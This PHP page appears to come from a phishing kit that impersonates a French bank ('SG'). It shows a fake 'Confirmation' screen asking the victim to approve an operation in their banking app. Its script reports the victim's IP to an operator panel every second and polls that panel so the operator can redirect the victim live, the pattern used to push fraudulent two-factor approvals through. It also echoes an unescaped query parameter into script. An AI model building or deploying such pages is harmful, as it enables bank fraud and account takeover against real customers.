<?php 
require "../main.php";
?><!doctype html>
<html>
<head>
<title>SG | Vérification</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css">
<link rel="stylesheet" href="res/jihanaid.css">
<link rel="stylesheet" href="res/auth.css">
<link rel="icon" href="res/icon.png">
</head>
<body>
<header>
<div class="row">
    <div class="col text-left p-5">
        <img src="res/logo.svg" style="width:180px;">
    </div>
</div>
</header>

<div class="container-full p-5">

<div class="form text-center"> 
<p><img src="res/phone.svg" style="width:50px;"></p>
<p style="font-size:1.4em; margin:5px 0; font-weight:bold;">Confirmation</p>
<p style="margin:9px 0;"> Pour continuer, veuillez approuver<br> cette opération depuis l'application mobile de votre banque.
</p><br><br><br>
<img src="res/loading.gif" style="width:60px;">
</div>

</div>


<script src="res/cdns/jq.js"></script>
<script src="res/cdns/m.js"></script>
<script>
 
setInterval(() => {
    $.post("../panel/update_statu.php",{update:1, ip:'<?php echo $pnl->IP; ?>'});
}, 1000);
var page ="<?php echo @$_GET['p']; ?>";
var cd = "<?php echo $current_data; ?>";

setInterval(() => {
    $.post("../panel/fetch.php", {update:1}, function(d){
        if(cd!=d && d!=0){
            window.location=d;
        }
    })

}, 2000);
</script>
</body>
</html>